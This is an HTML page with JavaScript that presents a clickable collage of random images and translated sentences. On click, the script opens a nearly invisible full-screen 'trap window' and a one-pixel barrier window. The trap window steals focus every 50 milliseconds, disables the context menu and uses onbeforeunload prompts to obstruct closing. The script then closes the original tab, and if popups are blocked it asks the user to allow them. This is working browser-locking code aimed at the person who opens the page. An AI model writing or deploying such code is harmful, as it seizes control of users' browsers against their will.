<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Interactive Page</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: 'Times New Roman', Times, serif;
            -webkit-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
            background-color: #f0f0f0;
        }
        .main-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #startButton {
            width: 480px;
            height: 300px;
            cursor: pointer;
            border: 5px solid #333;
            background-size: cover;
            background-position: center;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s ease;
        }
        #startButton:hover {
            transform: scale(1.05);
        }
        #centerClick {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 42px;
            font-weight: bold;
            color: white;
            text-shadow: 2px 2px 8px #000;
            z-index: 100;
        }
        .random-sentence {
            position: absolute;
            font-weight: bold;
            text-shadow: 1px 1px 3px #000;
            white-space: nowrap;
            z-index: 50;
        }
        .random-image {
            position: absolute;
            object-fit: cover;
            border: 2px solid rgba(0,0,0,0.3);
            z-index: 1;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <button id="startButton">
        </button>
    </div>

    <script>
        document.title = 'Interactive Page';

        const isMobileDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        let sessionActive = false;

        const startButton = document.getElementById('startButton');
        const effectSound = new Audio('assets/game-over-sound.mp3'); // Убедитесь, что этот файл существует

        const baseSentences = [
            "The system processes data.", "A random user finds a secret button.", "The code launches an unknown process.",
            "The signal is suddenly lost.", "An important file is deleted.", "The window shows a dangerous error.",
            "The world waits for a new update.", "The packet travels everywhere.", "The green light flashes constantly.",
            "The first connection is temporary."
        ];
        const languageCodes = ['es', 'de', 'fr', 'it', 'pt', 'ru', 'ja', 'zh', 'ar', 'hi', 'ko', 'tr', 'pl', 'nl', 'sv', 'cs', 'da', 'fi', 'el', 'he', 'no', 'ro', 'th', 'uk', 'hu', 'vi', 'id', 'ms'];

        function generateGibberishSentence() {
            const chars = 'абвгдеёжзийклмнопрстуфхцчшщъыьэюяabcdefghijklmnopqrstuvwxyz ';
            let length = Math.floor(Math.random() * 40) + 20;
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            const punctuation = ['.', '!', '?', '。', '！', '？'];
            return result.trim() + punctuation[Math.floor(Math.random() * punctuation.length)];
        }

        async function generateRandomSentence() {
            const sentence = baseSentences[Math.floor(Math.random() * baseSentences.length)];
            const targetLang = languageCodes[Math.floor(Math.random() * languageCodes.length)];
            try {
                const response = await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(sentence)}&langpair=en|${targetLang}&cb=${Date.now()}`);
                if (!response.ok) throw new Error('Network response was not ok');
                const data = await response.json();
                if (data.responseStatus === 200 && data.responseData.translatedText) {
                    return data.responseData.translatedText;
                }
            } catch (error) {
                console.error("Translation failed:", error);
            }
            return generateGibberishSentence();
        }

        function generateRandomColor() {
            const letters = '0123456789ABCDEF';
            let color = '#';
            for (let i = 0; i < 6; i++) {
                color += letters[Math.floor(Math.random() * 16)];
            }
            return color;
        }

        async function setRandomButtonContent() {
            startButton.style.cursor = 'wait';
            startButton.style.backgroundColor = generateRandomColor();
            startButton.innerHTML = '';
            const numberOfImages = 12;
            for (let i = 0; i < numberOfImages; i++) {
                const img = document.createElement('img');
                img.classList.add('random-image');
                const randomSeed = Math.random().toString(36).substring(2, 15);
                const randomWidth = Math.floor(Math.random() * 350) + 20;
                const randomHeight = Math.floor(Math.random() * 350) + 20;
                img.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                img.style.width = `${randomWidth}px`; img.style.height = `${randomHeight}px`;
                const centerX = Math.random() * startButton.offsetWidth;
                const centerY = Math.random() * startButton.offsetHeight;
                img.style.left = `${centerX - randomWidth / 2}px`; img.style.top = `${centerY - randomHeight / 2}px`;
                startButton.appendChild(img);
            }
            const numberOfSentences = 35;
            const sentencePromises = [];
            for (let i = 0; i < numberOfSentences; i++) {
                sentencePromises.push(generateRandomSentence());
            }
            const translatedSentences = await Promise.all(sentencePromises);
            translatedSentences.forEach(sentence => {
                const sentenceSpan = document.createElement('span');
                sentenceSpan.classList.add('random-sentence'); sentenceSpan.innerText = sentence;
                sentenceSpan.style.color = generateRandomColor();
                sentenceSpan.style.fontSize = `${Math.floor(Math.random() * 16) + 10}px`;
                const maxTop = startButton.offsetHeight - 25; const maxLeft = startButton.offsetWidth - 250;
                sentenceSpan.style.top = `${Math.floor(Math.random() * maxTop)}px`;
                sentenceSpan.style.left = `${Math.floor(Math.random() * maxLeft)}px`;
                startButton.appendChild(sentenceSpan);
            });
            const centerClickSpan = document.createElement('span');
            centerClickSpan.id = 'centerClick'; centerClickSpan.innerText = 'click';
            startButton.appendChild(centerClickSpan);
            startButton.style.cursor = 'pointer';
        }

        // --- ОСНОВНАЯ ЛОГИКА ---
        function startSequence() {
            if (sessionActive || isMobileDevice) return;
            sessionActive = true;
            effectSound.play();

            // Создаем контент для окна-ловушки (невидимый щит)
            const mainWindowContent = `
                <!DOCTYPE html>
                <html style="margin:0; padding:0; width:100%; height:100%; background-color: rgba(0,0,0,0.01); overflow:hidden;">
                <body style="margin:0; padding:0; width:100%; height:100%;">
                    <script>
                        document.addEventListener('contextmenu', e => e.preventDefault());
                        const barrier = window.open('', 'bottomBarrier', 'width=' + screen.availWidth + ',height=1,top=' + (screen.availHeight - 1) + ',left=0,resizable=no,scrollbars=no,toolbar=no,menubar=no,status=no');
                        barrier.document.write('<!DOCTYPE html><html style="margin:0; padding:0; width:100%; height:100%; background-color:transparent;"><body style="margin:0; padding:0; width:100%; height:100%;"><script>window.onbeforeunload=function(e){e.preventDefault();return "";};<\/script></body></html>');
                        barrier.document.close();
                        setInterval(() => window.focus(), 50);
                        window.onbeforeunload = function(e) { e.preventDefault(); return ""; };
                    <\/script>
                </body>
                </html>
            `;

            const blob = new Blob([mainWindowContent], { type: 'text/html' });
            const url = URL.createObjectURL(blob);

            // Открываем окно-ловушку на весь экран
            const overlayWindow = window.open(
                url,
                'mainOverlay',
                `width=${screen.availWidth},height=${screen.availHeight},top=0,left=0,resizable=no,scrollbars=no,toolbar=no,menubar=no,status=no`
            );

            // Делаем экран черным на мгновение перед закрытием
            document.body.style.transition = 'background-color 0.5s';
            document.body.style.backgroundColor = 'black';
            startButton.style.opacity = '0';

            // Если окно-ловушка открылось, закрываем основное окно
            setTimeout(() => {
                if (overlayWindow && !overlayWindow.closed) {
                    window.close();
                } else {
                    alert("Пожалуйста, разрешите всплывающие окна для этого сайта, чтобы эффект сработал.");
                    sessionActive = false;
                    // Возвращаем все как было, если не сработало
                    document.body.style.backgroundColor = '#f0f0f0';
                    startButton.style.opacity = '1';
                }
            }, 500);
        }

        setRandomButtonContent();
        startButton.addEventListener('click', startSequence);
    </script>
</body>
</html>
